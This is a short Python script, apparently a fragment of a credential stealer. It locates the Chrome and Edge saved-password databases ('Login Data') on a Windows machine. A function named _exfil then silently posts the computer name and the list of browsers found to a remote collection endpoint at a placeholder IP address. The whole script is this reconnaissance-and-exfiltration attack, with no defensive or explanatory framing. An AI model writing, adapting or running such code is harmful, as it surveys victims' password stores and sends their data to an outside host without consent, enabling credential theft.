import os, requests
PATHS = {'Chrome': os.path.join(os.getenv('LOCALAPPDATA') or '', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'), 'Edge': os.path.join(os.getenv('LOCALAPPDATA') or '', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')}

def _exfil(data):
    try:
        requests.post('http://192.0.2.99/collect', json=data, timeout=5)
    except Exception:
        pass
found = {b: p for b, p in PATHS.items() if os.path.exists(p)}
_exfil({'host': os.getenv('COMPUTERNAME'), 'paths': list(found.keys())})